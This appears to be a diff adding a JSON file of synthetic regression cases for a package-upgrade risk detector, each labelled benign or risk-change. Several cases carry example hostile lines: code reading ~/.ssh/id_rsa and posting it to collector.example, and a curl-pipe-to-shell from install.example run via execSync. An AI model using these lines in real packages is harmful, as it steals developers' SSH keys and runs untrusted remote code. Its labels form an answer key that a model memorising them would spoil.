@@ -1,0 +1,224 @@
+{
+  "schemaVersion": 1,
+  "labelSource": "maintainer-authored synthetic regression cases; not independently labelled malware",
+  "cases": [
+    {
+      "name": "benign-arithmetic-update",
+      "label": "benign",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 2;"
+        }
+      },
+      "added": [],
+      "notObserved": []
+    },
+    {
+      "name": "benign-http-client",
+      "label": "benign",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = url => fetch(url).then(r => r.text());"
+        }
+      },
+      "added": [],
+      "notObserved": []
+    },
+    {
+      "name": "new-install-hook",
+      "label": "risk-change",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+          "index.js": "module.exports = n => n + 1;",
+          "setup.js": "console.log('rebuilding native module');"
+        }
+      },
+      "added": [
+        "install-hook"
+      ],
+      "notObserved": []
+    },
+    {
+      "name": "unchanged-install-hook",
+      "label": "benign",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+          "index.js": "module.exports = n => n + 1;",
+          "setup.js": "console.log('rebuilding native module');"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+          "index.js": "module.exports = n => n + 1;",
+          "setup.js": "console.log('rebuilding native module');"
+        }
+      },
+      "added": [],
+      "notObserved": []
+    },
+    {
+      "name": "credential-reader-added",
+      "label": "risk-change",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "const fs=require(\"fs\"); const key=fs.readFileSync(process.env.HOME+\"/.ssh/id_rsa\",\"utf8\"); fetch(\"https://collector.example/upload\",{method:\"POST\",body:key});"
+        }
+      },
+      "added": [
+        "credential-access"
+      ],
+      "notObserved": []
+    },
+    {
+      "name": "credential-reader-no-longer-observed",
+      "label": "risk-change",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "const fs=require(\"fs\"); const key=fs.readFileSync(process.env.HOME+\"/.ssh/id_rsa\",\"utf8\"); fetch(\"https://collector.example/upload\",{method:\"POST\",body:key});"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "added": [],
+      "notObserved": [
+        "credential-access"
+      ]
+    },
+    {
+      "name": "hook-plus-credential-reader",
+      "label": "risk-change",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+          "index.js": "module.exports = n => n + 1;",
+          "setup.js": "console.log('rebuilding native module');"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+          "index.js": "const fs=require(\"fs\"); const key=fs.readFileSync(process.env.HOME+\"/.ssh/id_rsa\",\"utf8\"); fetch(\"https://collector.example/upload\",{method:\"POST\",body:key});",
+          "setup.js": "console.log('rebuilding native module');"
+        }
+      },
+      "added": [
+        "credential-access"
+      ],
+      "notObserved": []
+    },
+    {
+      "name": "install-hook-removed",
+      "label": "risk-change",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\",\"scripts\":{\"postinstall\":\"node setup.js\"}}",
+          "index.js": "module.exports = n => n + 1;",
+          "setup.js": "console.log('rebuilding native module');"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "added": [],
+      "notObserved": [
+        "install-hook"
+      ]
+    },
+    {
+      "name": "comment-lookalike",
+      "label": "benign",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "// Example only: fetch(\"https://example.test\", process.env.TOKEN)\nmodule.exports = n => n + 1;"
+        }
+      },
+      "added": [],
+      "notObserved": []
+    },
+    {
+      "name": "new-remote-shell",
+      "label": "risk-change",
+      "before": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "module.exports = n => n + 1;"
+        }
+      },
+      "after": {
+        "packageName": "upgrade-fixture",
+        "sourceFiles": {
+          "package.json": "{\"name\":\"upgrade-fixture\",\"repository\":\"https://github.com/example/upgrade-fixture\",\"main\":\"index.js\"}",
+          "index.js": "require(\"child_process\").execSync(\"curl https://install.example/payload | sh\");"
+        }
+      },
+      "added": [
+        "remote-code-load"
+      ],
+      "notObserved": []
+    }
+  ]
+}
